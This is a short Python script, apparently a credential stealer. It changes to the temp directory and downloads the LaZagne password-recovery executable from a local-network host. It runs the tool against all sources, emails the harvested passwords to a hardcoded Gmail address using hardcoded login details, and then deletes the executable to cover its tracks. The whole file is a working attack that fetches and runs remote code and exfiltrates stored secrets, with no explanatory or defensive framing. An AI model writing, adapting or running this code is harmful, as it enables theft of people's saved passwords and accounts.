import requests
import subprocess
import smtplib
import os
import tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    print(get_request.content)
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://192.168.1.165/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("trevorbarrow96@gmail.com", "test", result)
os.remove("lazagne.exe")